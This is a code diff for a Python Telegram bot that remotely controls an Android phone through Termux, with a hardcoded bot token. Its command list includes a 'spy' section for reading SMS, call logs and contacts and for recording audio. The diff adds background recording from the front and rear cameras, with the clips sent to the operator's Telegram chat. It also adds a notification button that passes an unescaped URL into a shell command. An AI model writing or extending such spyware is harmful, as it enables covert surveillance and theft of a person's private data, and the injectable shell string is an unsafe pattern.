@@ -1,6 +1,6 @@
 import telebot
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
-import subprocess, os, json, time, signal
+import subprocess, os, json, time, signal, threading
 
 TOKEN = '8733717882:AAHOxAckqRFA_xZG6Zppjqel_KyvbAeXgvg'
 ADMIN_ID = 6678107119
@@ -33,14 +33,16 @@ def start(message):
         "/torch on|off — фонарик\n"
         "/vibrate 5 — вибрация\n"
         "/battery — батарея\n"
-        "/photo /selfie — камера\n"
+        "/photo /selfie — фото\n"
+        "/video 20 — видео задняя (сек)\n"
+        "/selfievideo 20 — видео фронт (сек)\n"
         "/location — GPS\n"
         "/clip — буфер\n"
         "/brightness 50 — яркость\n"
         "/notify текст — уведомление\n"
         "/device — модель/Android\n"
         "/silent — беззвучный\n"
-        "/open ссылка — открыть сайт\n\n"
+        "/open ссылка — уведомление с кнопкой\n\n"
         "🕵️ <b>ШПИОН</b>\n"
         "/sms /calls /contacts\n"
         "/record 10 — запись\n"
@@ -205,8 +207,16 @@ def open_cmd(message):
     u = message.text.replace('/open','').strip()
     if not u: bot.reply_to(message, "Напиши: /open https://..."); return
     try:
-        subprocess.run(["termux-open", u], check=True)
-        bot.reply_to(message, f"🌐 {u}")
+        # Уведомление с кнопкой — работает из любого приложения и из фона
+        subprocess.run([
+            "termux-notification",
+            "--title", "🌐 Открыть ссылку",
+            "--content", u[:100],
+            "--button1", "Открыть",
+            "--button1-action", f"termux-open '{u}'",
+            "--id", "99"
+        ], check=True)
+        bot.reply_to(message, f"🔔 Потяни шторку и нажми «Открыть»")
     except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
 
 # ── ШПИОН ──
@@ -250,14 +260,54 @@ def record_cmd(message):
     if sec > 60: sec = 60
     bot.reply_to(message, f"🎤 {sec} сек...")
     path = "/sdcard/Download/a51_record.m4a"
-    try:
-        subprocess.Popen(["termux-microphone-record","-f",path,"-l",str(sec)])
-        time.sleep(sec+2)
-        subprocess.run(["termux-microphone-record","-q"], check=True)
-        if os.path.exists(path):
-            with open(path,'rb') as f: bot.send_voice(message.chat.id, f)
-            os.remove(path)
-    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
+    def _do():
+        try:
+            subprocess.Popen(["termux-microphone-record","-f",path,"-l",str(sec)])
+            time.sleep(sec+2)
+            subprocess.run(["termux-microphone-record","-q"])
+            if os.path.exists(path):
+                with open(path,'rb') as f: bot.send_voice(message.chat.id, f)
+                os.remove(path)
+        except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
+    threading.Thread(target=_do, daemon=True).start()
+
+def _record_video(message, cam_index, sec, label):
+    """Универсальная запись видео через ffmpeg."""
+    path = f"/sdcard/Download/a51_video_{cam_index}.mp4"
+    def _do():
+        try:
+            if os.path.exists(path): os.remove(path)
+            subprocess.run([
+                "ffmpeg", "-y",
+                "-f", "android_camera",
+                "-camera_index", str(cam_index),
+                "-t", str(sec),
+                path
+            ], capture_output=True, timeout=sec+25)
+            if os.path.exists(path) and os.path.getsize(path) > 1000:
+                with open(path,'rb') as f:
+                    bot.send_video(message.chat.id, f, duration=sec, caption=label)
+                os.remove(path)
+            else:
+                bot.reply_to(message,
+                    "❌ Не записалось. Убедись что ffmpeg установлен:\n"
+                    "pkg install ffmpeg")
+        except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
+    threading.Thread(target=_do, daemon=True).start()
+
+@bot.message_handler(commands=['video'])
+def video_cmd(message):
+    p = message.text.split()
+    sec = max(1, min(int(p[1]) if len(p)>1 and p[1].isdigit() else 10, 30))
+    bot.reply_to(message, f"🎥 Снимаю {sec} сек (задняя)...")
+    _record_video(message, 0, sec, "📹 Задняя камера")
+
+@bot.message_handler(commands=['selfievideo'])
+def selfievideo_cmd(message):
+    p = message.text.split()
+    sec = max(1, min(int(p[1]) if len(p)>1 and p[1].isdigit() else 10, 30))
+    bot.reply_to(message, f"🤳 Снимаю {sec} сек (фронт)...")
+    _record_video(message, 1, sec, "🤳 Фронтальная камера")
 
 @bot.message_handler(commands=['wifi'])
 def wifi_cmd(message):
@@ -374,6 +424,8 @@ def handle_webapp(message):
         elif cmd == '/play': play_cmd(fake)
         elif cmd == '/stop': stop_cmd(fake)
         elif cmd == '/volume': vol_cmd(fake)
+        elif cmd == '/video': video_cmd(fake)
+        elif cmd == '/selfievideo': selfievideo_cmd(fake)
         else: bot.send_message(message.chat.id, f"❓ {raw[:40]}")
     except Exception as e:
         print(f"[WEBAPP] ERROR: {e}")
